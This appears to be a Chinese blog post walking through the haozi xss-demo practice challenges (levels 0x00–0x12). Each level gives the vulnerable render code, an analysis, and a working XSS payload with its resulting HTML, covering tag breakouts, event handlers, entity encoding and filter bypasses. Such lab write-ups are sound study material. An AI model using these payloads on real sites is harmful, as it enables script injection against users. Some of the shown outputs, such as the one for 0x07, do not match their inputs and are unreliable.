---
title: haozi/xss-demo笔记
date: 2018-10-08 21:59:54
tags: xss
categories: xss
---

# haozi/xss-demo笔记

在线xss题目,用于xss学习,弹出alert(1)就过关.

地址:https://xss.haozi.me

项目: https://github.com/haozi/xss-demo ,有提供的答案https://github.com/haozi/xss-demo/issues/1

自带alert(1)的js地址：https://xss.haozi.me/j.js

# 0x00

## server code:

```
function render (input) {
  return '<div>' + input + '</div>'
}
```

## 分析:

```
没有过滤,在<div>标签中输出
```

## input code:



```
1. <script>alert('1')</script>

2. <script>alert`1`</script>

3. 利用外联方式 
<script src=https://xss.haozi.me/j.js></script>   

4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。
<img src='' onerror='alert(1)'>

5.  利用html的字符实体和SVG。
    SVG意为可缩放矢量图形（Scalable Vector Graphics）。
    SVG 使用 XML 格式定义图像。
   <svg><script>alert&#x28;1&#x29;</script></svg>

```

## html:

```
   1. <div><script>alert('1')</script></div>
   2. <div><script>alert`1`</script></div>
   3. <div><script src=https://xss.haozi.me/j.js></script></div>
   4. <div><img src='' onerror='alert(1)'></div>
   5. <div><svg><script>alert&#x28;1&#x29;</script></svg></div>
```

![000](/img/xss/haozi/000.png)

#  0x01

## server code:

```
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

## 分析:

```
在<textarea>中,没有过滤,构造闭合
```

## input code:

```
1. </textarea><script>alert('1')</script>
```


## html:

 ```
1. <textarea></textarea><script>alert('1')</script></textarea>
 ```

![001](/img/xss/haozi/001.png)

# 0x02

## server code:

```
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

## 分析:

```
在<input>中,没有过滤,双引号闭合,构造双引号闭合
```

## input code:

```
1. "><script>alert('1')</script>
```

## html:

```
1. <input type="name" value=""><script>alert('1')</script>">
```



![002](/img/xss/haozi/002.png)

# 0x03

## server code:

```
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

## 分析:

```
过滤了(),想办法用其他方式代替()
```

## input code:

```
1. <script>alert`1`</script>
2. 
    利用html的字符实体和SVG。
    SVG意为可缩放矢量图形（Scalable Vector Graphics）。
    SVG 使用 XML 格式定义图像。
    <svg><script>alert&#x28;1&#x29;</script></svg>
 3. 利用外联
 <script src=https://xss.haozi.me/j.js></script>
 4. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 
 <img src='' onerror="alert&#x28;&#x31;&#x29;">
 

```

## html:

```
1. <script>alert`1`</script>
2. <svg><script>alert&#x28;1&#x29;</script></svg>
3. <script src=https://xss.haozi.me/j.js></script>
4. <img src='' onerror="alert&#x28;&#x31;&#x29;">
```

![003](/img/xss/haozi/003.png)

# 0x04

## server code:

```
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

## 分析:

```
多过滤了`
```

## input code:

```
1. 
    利用html的字符实体和SVG。
    SVG意为可缩放矢量图形（Scalable Vector Graphics）。
    SVG 使用 XML 格式定义图像。
    <svg><script>alert&#x28;1&#x29;</script></svg>
 2. 利用外联
 <script src=https://xss.haozi.me/j.js></script>
 3. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 
 <img src='' onerror="alert&#x28;&#x31;&#x29;">
 

```

## html:

```
1. <svg><script>alert&#x28;1&#x29;</script></svg>
2. <script src=https://xss.haozi.me/j.js></script>
3. <img src='' onerror="alert&#x28;&#x31;&#x29;">
```



![004](/img/xss/haozi/004.png)

# 0x05

## server code:

```
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```

## 分析:

```
构造闭合
```

## input code:

```
1. --!><script>alert(1)</script>

```

## html:

```
1. <!-- --!><script>alert(1)</script> -->
```

![005](/img/xss/haozi/005.png)

# 0x06

## server code:

```
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

## 分析:

```
过滤>和以auto开头或者on开头，=等号结尾的标签属性并替换成_，且忽略大小写；

1. 可以先定义type='image',等价于img标签的方法了。 然后利用换行使=与onerror隔开
2. 用on开头的触发事件
```

## input code:

```
1. 
type='image' src='' onerror
=alert(1)

2.onmouseover
=alert(1)

```

## html:

```
1. <input value=1 type='image' src='' onerror
=alert(1) type="text">
2.<input value=1 onmouseover
=alert(1) type="text">
```

![006](/img/xss/haozi/006.png)

# 0x07

## server code:

```
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

## 分析:

```
过滤了<>包含的所有内容并替换成空,利用浏览器兼容性绕过
```

## input code:

```
1. 
<img src='' onerror=alert`1`
     //这里有个换行
```

## html:

```
1. <input value=1 type='image' src='' onerror
=alert(1) type="text">

```

![007](/img/xss/haozi/007.png)

# 0x08

## server code:

```
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

## 分析:

```
过滤了</style>的大小写。如果输入了</style>会被替换成/* 坏人 */。通过换行绕过<style>即可。
```

## input code:

```
1. 
</style
       ><img src='' onerror=alert`1`>

```

## html:

```
1. <style>
      </style
       ><img src='' onerror=alert`1`>
    </style>

```

![008](/img/xss/haozi/008.png)

# 0x09

## server code:

```
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

## 分析:

```
用正则表达式匹配'https(http)://www.segmentfault.com',构造闭合即可。
```

## input code:

```
1. 
https://www.segmentfault.com"></script><script>alert(1)</script>

```

## html:

```
1. <script src="https://www.segmentfault.com"></script><script>alert(1)</script>"></script>

```

![009](/img/xss/haozi/009.png)

# 0x0A

## server code:

```
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

## 分析:

```
用正则表达式匹配'https(http)://www.segmentfault.com',用html实体替换&'"<>\。
1.利用url中的@引用js
2.直接在给定的网址https://www.segmentfault.com 注册账号，新建一个笔记，内容为alert(1)，再调用这个笔记链接即可，需要换行
```

## input code:

```
1. https://www.segmentfault.com@xss.haozi.me/j.js
2. https://www.segmentfault.com/n/
1330000016631643/raw （这一行换行）

```

## html:

```
1. <script src="https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js"></script>
2. <script src="https:&#x2f&#x2fwww.segmentfault.com&#x2fn&#x2f
1330000016631643&#x2fraw"></script>
```

![00A](/img/xss/haozi/00A.png)

# 0x0B

## server code:

```
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

## 分析:

```
将输入的数据用toUpperCase进行了大写转换。可以利用html 标签, 域名 不区分大小写的方式来攻克。
1.引用外部链接解决
```

## input code:

```
1. 
<script src="https://xss.haozi.me/j.js"></script>


```

## html:

```
1. <h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT>
</h1>
```

![00B](/img/xss/haozi/00B.png)

# 0x0C

## server code:

```
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

## 分析:

```
首先将script不论大小写用空替换,并将输入的数据用toUpperCase进行了大写转换。绕过script过滤后利用html 标签, 域名 不区分大小写的方式来攻克。
1.引用外部链接解决
```

## input code:

```
1. <scscriptript src="https://xss.haozi.me/j.js"></scscriptript>


```

## html:

```
1. <h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
```

![00C](/img/xss/haozi/00C.png)

# 0x0D

## server code:

```
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

## 分析:

```
过滤了</"',并用//单行注释,但是可以换行绕过过滤,使用html注释-->来注释后面的js，使代码正常运行。
```

## input code:

```
1.
//这一行换行
alert(`1`)
-->


```

## html:

```
1. 
<script>
          // alert('
alert(`1`)
-->')
```

![00D](/img/xss/haozi/00D.png)

# 0x0E

## server code:

```
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

## 分析:

```
将<后的第一个字符变成了_字符,导致<script>变成<_script>,有个特殊ſ 字符,是古英语中的s的写法, 转成大写是正常的S。
```

## input code:

```
1.<ſcript src="https://xss.haozi.me/j.js"></script>


```

## html:

```
1. <h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
```

![00E](/img/xss/haozi/00E.png)

# 0x0F

## server code:

```
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

## 分析:

```
对html inline js 转义就是做无用功，浏览器会先解析html, 然后再解析 js。构造闭合就行。
```

## input code:

```
1.');alert('1


```

## html:

```
1. <img src onerror="console.error('&#39;);alert(&#39;1')">
```

![00F](/img/xss/haozi/00F.png)

# 0x10

## server code:

```
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

## 分析:

```
用；拆分加上alert(1)就行。
```

## input code:

```
1. 123;alert(1)


```

## html:

```
1.  
<script>
  window.data = 123;alert(1)
</script>
```

![010](/img/xss/haozi/010.png)

# 0x11

## server code:

```
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```

## 分析:

```
将"替代\",构造闭合绕过,这里的坑是它替代的\需要手动加一个、
因为" 被转义成 \" 经过html 解析后 console.log("\")会报语法错误, 再补个 \ 即可
```

## input code:

```
1. "),alert("1


```

## html:

```
1.  
<script>
  var url = 'javascript:console.log("\"),alert(\"1")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
```

![011](/img/xss/haozi/011.png)

# 0x12

## server code:

```
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

## 分析:

```
构造闭合
1. 可以用”)闭合console.log("
2. 用</script>闭合<script>
```

## input code:

```
1. "),alert("1
2. 
</script>
<script>alert(1)</script>
<script>


```

## html:

```
1.  
<script>console.log("\\");alert(`1`);<!--");</script>
2.
<script>console.log("</script>
<script>alert(1)</script>
<script>");</script>
```

![012](/img/xss/haozi/012.png)